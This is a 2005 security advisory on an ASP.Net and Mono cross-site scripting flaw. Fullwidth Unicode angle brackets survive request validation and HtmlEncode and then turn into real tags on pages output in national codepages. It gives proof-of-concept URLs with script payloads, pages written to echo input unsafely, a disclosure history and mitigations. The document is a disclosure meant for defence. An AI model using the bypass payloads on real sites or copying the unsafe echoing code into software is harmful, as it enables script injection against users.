# XSS vulnerability in ASP.Net

Andrey Rusyaev, post-graduate student of chair of Information Security of Far East State University, Vladivostok, Russia, [andir@it-project.ru](mailto:andir@it-project.ru)

February 9, 2005, Updated February 14, 2005

### Abstract

In specific conditions the cross-site scripting attack (XSS) [1] are possible on web site under management ASP.Net, because used a wrong filtration of special HTML characters. Attack exploits vulnerability of mechanism of converting Unicode strings [2] to national ASCII codepages. The basic problem arises from the lack of a filtration of special HTML characters in range U+ff00-U+ff60 (fullwidth ASCII characters [3]).

### Introduction

The problem has been discovered in August 2004. Affected all versions of .Net Framework what exist at present day:

1. .Net Framework, version 1.0,
2. .Net Framework, version 1.0 + service pack 1,
3. .Net Framework, version 1.0 + service pack 2,
4. .Net Framework, version 1.1,
5. .Net Framework, version 1.1 + service pack 1,
6. .Net Framework, version 1.1 + service pack 1 + Security Bulletin MS05-004 February 8, 2005.

After some testing, similar problem has been discovered in free implementation of .Net Framework by Mono Project [4]. Affected following versions:

1. Mono, version 1.0.5.

### Background

.Net Framework manipulates strings in Unicode only. Converting from/to national codepages ASCII is possible for input/output respectively. In particular, HTML text may be outputted on Web page in national ASCII codepage (such as &#39;windows-1251&#39;, &#39;koi-8&#39;, and more) with using ASP.Net. In this conditions Unicode characters from range U+ff00-U+ff60 (fullwidth ASCII characters) would be converted to normal ASCII characters respectively. Among fullwidth ASCII characters present some special HTML characters (such as &#39;<&#39;, &#39;>&#39;, and others), which may be used for injecting malicious HTML code or malicious script code (with \<script> HTML tag) or other variants (more details in [5]).

### Vulnerability Details

Has been discovered that mechanism of ASP.Net has no filtration of special HTML characters (such as &#39;<&#39;, &#39;>&#39; and others) in Unicode strings for output web page in one from national ASCII codepages.

1. Injection of special HTML characters to ASP.Net web-page with using Unicode characters from fullwidth ASCII characters range.

Example:

    http://server.com/attack1.aspx?test=%uff1cscript%uff1ealert(&#39;vulnerability&#39;)%uff1c/script%uff1e

Web page _&#39;attack1.aspx&#39;_ prints HTTP request parameter &#39;test&#39;.

Web page like following:
```csharp
    <!-- Web page attack1.aspx -->
    <% @Page Language="cs" %>
    <%
    Response.Write(Request.QueryString["test"]); // Attack through URL parameter
    %>
```

_Web.config_ for _server.com_ like following:
```xml
    <configuration>
        <system.web>
            <globalization **responseEncoding="windows-1251"** />
        </system.web>
    </configuration>
```

1. ASP.NET Request Validation Bypass Vulnerability.

The "Request Validation" mechanism designed to protect against Cross-Site
 Scripting and SQL injection allows restricted tags in Unicode range of fullwidth ASCII characters U+ff00-U+ff60.

Example:

    http://server.com/attack2.aspx?test=%uff1cscript%uff1ealert(&#39;vulnerability&#39;)%uff1c/script%uff1e

Web page _&#39;attack2.aspx&#39;_ prints HTTP request parameter &#39;test&#39;.

Web page like following:
```csharp
    <!-- Web page attack2.aspx -->
    <% @Page Language="cs" **validateRequest="true"** %>
    <%
    Response.Write(Request.QueryString["test"]); // Attack through URL parameter
    %>
```

_Web.config_ for _server.com_ like following:
```xml
    <configuration>
        <system.web>
            <globalization **responseEncoding="windows-1251"** />
        </system.web>
    </configuration>
```

_Note: attribute of ASP.Net Web page � validateRequest allowed only for ASP.Net of version 1.1 and more, or for Mono (no any information about versions) [6]._

1. HTML Encoding methods bypass.

_Note: This attack does not applied to ASP.Net in Mono implementation._

HttpServerUtility.HtmlEncode has no filtration mechanism for Unicode characters from range U+ff00-U+ff60.

The methods for encoding special HTML characters does not protect from attacks in previous examples. Encoding process used before converting to national ASCII codepage for output, and attacker may use fullwidth ASCII characters for injecting malicious code on Web page.

Example:

    http://server.com/attack3.aspx?test=%uff1cscript%uff1ealert(&#39;vulnerability&#39;)%uff1c/script%uff1e

Web page _&#39;attack3.aspx&#39;_ prints:

1. HTTP request parameter &#39;test&#39;_,_
2. Some string with injected Unicode characters.

Web page like following:
```csharp
    <!-- Web page attack3.aspx -->
    <% @Page Language="cs" %>
    <%
        Response.Write(Server.HtmlEncode(Request.QueryString["test"])); // 1) Attack through URL parameter

        string code = Server.HtmlEncode("\xff1cscript\xff1ealert(&#39;vulnerability&#39;)\xff1c/script\xff1e"); 2) Attack through injected Unicode characters

        Response.Write(code);
    %>
```

_Web.config_ for _server.com_ like following:
```xml
    <configuration>
        <system.web>
            <globalization **responseEncoding="windows-1251"** />
        </system.web>
    </configuration>
```

### Protection Methods

Some variants of protection methods may be proposed.

1. Use only Unicode codepage for output on ASP.Net pages, for this purpose add web.config like following:
```xml
    <configuration>
        <system.web>
            <globalization responseEncoding="utf-8" />
        </system.web>
    </configuration>
```

1. If you cannot use Unicode, you must to filter fullwidth ASCII characters from any untrusted data sources (user input, HTTP headers, some components ouput and other data).

### More Information

About this vulnerability has been reported to Microsoft Security Response Center at August 2, 2004 and received answer that opened case 5438 for description of vulnerability. Later, I received following answer:

"_We have decided that a KB article and update to tools and/or best practice guidelines should be done for this, and will be as time permits. We are not tracking this case as a security bulletin"_.

Vulnerability has no patch at current moment (February 9, 2005).

### References

1. CERT� Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests, [http://www.cert.org/advisories/CA-2000-02.html](http://www.cert.org/advisories/CA-2000-02.html)
2. Unicode Home Page, [http://unicode.org/](http://unicode.org/).
3. Unicode.org, Halfwidth and Fullwidth Forms, [http://www.unicode.org/charts/PDF/UFF00.pdf](http://www.unicode.org/charts/PDF/UFF00.pdf).
4. Mono Project, [http://mono-project.com/](http://mono-project.com/).
5. CGISecurity.com, "The Cross Site Scripting FAQ.", ��� 2002, http://www.cgisecurity.com/articles/xss-faq.shtml.
6. .Net Framework SDK, @Page directive, ValidateRequest attribute, [http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpgenref/html/cpconPage.asp](http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpgenref/html/cpconPage.asp).